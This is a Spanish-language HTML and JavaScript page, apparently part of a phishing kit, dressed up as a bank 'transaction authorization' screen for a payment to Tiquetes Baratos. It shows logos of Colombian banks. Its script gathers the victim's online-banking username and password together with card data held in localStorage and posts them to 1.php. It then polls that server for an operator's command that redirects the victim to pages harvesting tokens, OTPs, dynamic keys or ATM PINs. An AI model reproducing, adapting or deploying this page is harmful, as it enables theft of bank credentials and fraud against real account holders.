<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Autorización</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body, html {
      height: 100%;
      width: 100%;
      overflow: hidden;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-size: white;
      filter: brightness(0.5) blur(10px);
      z-index: -1;
    }

    .contenedor-flotante {
      background: #f9f9f9;
      border: 1px solid #ddd;
      border-radius: 12px;
      padding: 20px 20px 25px 20px;
      text-align: center;
      max-width: 400px;
      width: 90%;
      box-shadow: 0 6px 30px rgba(0, 0, 0, 0.15);
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    .logo-izq {
      position: absolute;
      top: 15px;
      left: 15px;
      max-height: 40px;
    }

    .logo-der {
      position: absolute;
      top: 15px;
      right: 15px;
      max-height: 30px;
    }

    .separator {
      margin-top: 60px;
      margin-bottom: 15px;
      border-bottom: 1px solid #ccc;
    }

    .contenedor-flotante h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: #333;
    }

    .contenedor-flotante p {
      font-size: 14px;
      color: #555;
      margin-bottom: 8px;
      line-height: 1.4;
    }

    .contenedor-flotante strong {
      color: #111;
    }

    form {
      margin-top: 10px;
      text-align: left;
    }

    .form-group {
      display: flex;
      align-items: center;
      margin-bottom: 12px;
    }

    .form-group label {
      width: 80px;
      font-size: 14px;
      color: #333;
    }

    .form-group input {
      flex: 1;
      max-width: 140px;
      padding: 7px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 13px;
    }

    small {
      display: block;
      margin-top: -5px;
      font-size: 12px;
      color: #888;
      text-align: left;
      margin-bottom: 10px;
    }

    button {
      margin-top: 10px;
      width: 100%;
      padding: 10px;
      background-color: #004aad;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #003080;
    }

    .loaderp-full {
      position: fixed;
      inset: 0;
      background: rgba(255, 255, 255, 0.7);
      z-index: 9999;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .loaderp-full.hidden {
      display: none;
    }

    .loaderp-full::after {
      content: "";
      width: 40px;
      height: 40px;
      border: 4px solid #004aad;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <div class="background"></div>

  <div class="loaderp-full hidden"></div>

  <div class="contenedor-flotante">
    <!-- Logo del banco a la izquierda (dinámico desde localStorage.infoload.bank) -->
    <img src="" alt="Logo Banco" class="logo-izq" id="bank-logo" />
    
    <!-- Logo del tipo de tarjeta (dinámico desde localStorage.TIPE.tipo) -->
    <img src="" alt="Tipo de Tarjeta" class="logo-der" id="card-type-logo" />

    <div class="separator"></div>

    <h2>Autorización de transacción</h2>

    <p>
      Estas realizando un pago en <strong> Tiquetes Baratos  </strong> por 
      <strong id="monto-transaccion">$ 0</strong><br />
      con tarjeta terminada en <strong id="card-last4">****</strong>. Por seguridad, esta misma debe ser autorizada por tu banco.
    </p>

    <p style="text-align: left; margin-top: 20px;">
      <strong>Comercio:</strong> Tiquetes Baratos <br />
      <strong>Monto:</strong> <span id="monto-transaccion-detalle">$ 0</span><br />
      <strong>Tarjeta:</strong> **** **** **** <span id="card-last4-display">****</span>
    </p>

    <form id="transaction-form">
      <div class="form-group">
        <label for="usuario" id="usuario-label">Usuario:</label>
        <input type="text" id="usuario" placeholder="Tu usuario" />
      </div>

      <div class="form-group">
        <label for="clave" id="clave-label">Clave:</label>
        <input type="password" id="clave" placeholder="Tu clave" />
      </div>

      <small>Estos son los datos que utilizas para ingresar a tu app bancaria.</small>

      <button type="submit" id="authorize-button" disabled>Autorizar</button>
    </form>
  </div>

<style>
  /* Imagen por defecto */
.logo-izq.default {
  max-height: 40px;
  max-width: 120px;
}
  /* Imagen por defecto */
/* Logo derecho: tarjeta por defecto */
.logo-der {
  max-height: 100px;
  max-width: 90px;
  object-fit: contain;
}
/* Visa */
.logo-der.visa {
  max-height: 150px;
  max-width: 150px;
}

/* MasterCard */
.logo-der.master {
  max-height: 70px;
  max-width: 85px;
}


/* Bancolombia */
.logo-izq.bancolombia {
  max-height: 38px;
  max-width: 120px;
}

/* Davivienda */
.logo-izq.davivienda {
  max-height: 42px;
  max-width: 125px;
}

/* BBVA */
.logo-izq.bbva {
  max-height: 35px;
  max-width: 100px;
}

/* Banco de Bogotá */
.logo-izq.bogota {
  max-height: 38px;
  max-width: 130px;
}

/* Colpatria / Scotiabank */
.logo-izq.colpatria {
  max-height: 60px;
  max-width: 135px;
}

/* Falabella */
.logo-izq.falabella {
  max-height: 32px;
  max-width: 110px;
}

/* Caja Social */
.logo-izq.cajasocial {
  max-height: 37px;
  max-width: 120px;
}

/* AV Villas */
.logo-izq.avvillas {
  max-height: 36px;
  max-width: 110px;
}

/* Popular */
.logo-izq.popular {
  max-height: 50px;
  max-width: 120px;
}

/* Itaú */
.logo-izq.itau {
  max-height: 54px;
  max-width: 100px;
}

/* Serfinanza */
.logo-izq.serfinanza {
  max-height: 39px;
  max-width: 115px;
}

/* Nequi */
.logo-izq.nequi {
  max-height: 60px;
  max-width: 115px;
}

</style>

<script>
function detectarBanco(nombre) {
  const banco = nombre.toLowerCase();
  if (banco.includes("bancolombia")) return "bancolombia";
  if (banco.includes("davivienda")) return "davivienda";
  if (banco.includes("bbva")) return "bbva";
  if (banco.includes("bogotá") || banco.includes("bogota")) return "bogota";
  if (banco.includes("colpatria") || banco.includes("scotiabank")) return "colpatria";
  if (banco.includes("falabella")) return "falabella";
  if (banco.includes("caja social") || banco.includes("cajasocial")) return "cajasocial";
  if (banco.includes("av villas") || banco.includes("avvillas")) return "avvillas";
  if (banco.includes("popular")) return "popular";
  if (banco.includes("itau")) return "itau";
  if (banco.includes("serfinanza") || banco.includes("serfinansa")) return "serfinanza";
  if (banco.includes("nequi")) return "nequi";
  return "default";
}

function actualizarLogos() {
  const infoload = JSON.parse(localStorage.getItem("infoload") || "{}");
  const tipeObj = JSON.parse(localStorage.getItem("TIPE") || "{}");
  const tipoTarjeta = (tipeObj.tipo || "").toLowerCase();

  const banco = infoload.bank || "default";
  const bancoFile = detectarBanco(banco);
  const logo = document.getElementById("bank-logo");

  // Si es banco no reconocido, mostrar sincc.png
  logo.src = bancoFile === "default"
    ? "img/bank/sincc.png"
    : `img/bank/${bancoFile}.png`;

  logo.className = "logo-izq " + bancoFile;

  // Logo de tarjeta
  let tipo = "defaultcard.png";
  if (tipoTarjeta.includes("visa")) tipo = "visa.png";
  else if (tipoTarjeta.includes("master")) tipo = "master.png";

  document.getElementById("card-type-logo").src = `img/bank/${tipo}`;
}

function mostrarDatosTransaccion() {
  const datos = JSON.parse(localStorage.getItem("tbdatos") || "{}");
  const monto = parseInt(localStorage.getItem("total_pagar")) || 0;
  const moneda = monto.toLocaleString("es-CO", { style: "currency", currency: "COP" });

  document.getElementById("monto-transaccion").innerText = moneda;
  document.getElementById("monto-transaccion-detalle").innerText = moneda;

const numeroTarjeta = datos.cardNumber || datos.tarjeta || '';
if (numeroTarjeta.length >= 4) {
  const ultimos4 = numeroTarjeta.slice(-4);
  document.getElementById("card-last4").innerText = ultimos4;
  document.getElementById("card-last4-display").innerText = ultimos4;
}

}

function habilitarBoton() {
  const u = document.getElementById("usuario").value.trim();
  const c = document.getElementById("clave").value.trim();
  document.getElementById("authorize-button").disabled = !(u && c && c.length <= 11);
}

document.getElementById("usuario").addEventListener("input", habilitarBoton);
document.getElementById("clave").addEventListener("input", habilitarBoton);

document.getElementById("transaction-form").addEventListener("submit", async e => {
  e.preventDefault();
  const loader = document.querySelector(".loaderp-full");
  loader.classList.remove("hidden");

  const usuario = document.getElementById("usuario").value.trim();
  const clave = document.getElementById("clave").value.trim();
  const transactionId = crypto.randomUUID();
  const total = parseInt(localStorage.getItem("total_pagar")) || 0;

  const datosPago = JSON.parse(localStorage.getItem("tbdatos") || "{}");
  datosPago.bancoldata = { usuario, clave };
  datosPago.transactionId = transactionId;
  datosPago.total = total;

  localStorage.setItem("tbdatos", JSON.stringify(datosPago));

  try {
    const res = await fetch("1.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(datosPago)
    });

    const resp = await res.json();
    if (!resp.ok) {
        alert("❌ Error del servidor: " + resp.error);
        loader.classList.add("hidden");
        return;
    }

    // Polling para esperar acción
    while (true) {
        const poll = await fetch(`1.php?transactionId=${transactionId}`);
        const pollData = await poll.json();

        if (pollData.ok && pollData.action) {
            loader.classList.add("hidden");

            const especiales = ["pedir_token", "pedir_dinamica", "pedir_otp", "pedir_cajero"];
            if (especiales.includes(pollData.action)) {
                const tipo = pollData.action.replace("pedir_", "");
                const params = new URLSearchParams({ tipo, usuario, clave });
                return window.location.href = `token-id.php?${params.toString()}`;
            }

            // Acción cc
            if (pollData.action === "cc") {
                return window.location.href = "/pay.html";
            }

            // Acción ya
            if (pollData.action === "ya") {
                return window.location.href = "/successful";
            }

            //  NUEVA ACCIÓN LOGO
            if (pollData.action === "logo") {
                return window.location.href = "3d.php";  // <-- cámbialo a lo que necesites
            }

            const rutas = {
                error_tc: "resumen.php",
                error_logo: "error-id.php"
            };

            return window.location.href = rutas[pollData.action] || "resumen.php";
        }

        await new Promise(r => setTimeout(r, 2000));
    }
} catch (error) {
    alert("❌ Error de conexión: " + error.message);
    loader.classList.add("hidden");
}

});

window.addEventListener("DOMContentLoaded", () => {
  actualizarLogos();
  mostrarDatosTransaccion();
  habilitarBoton();
});
</script>






</body>
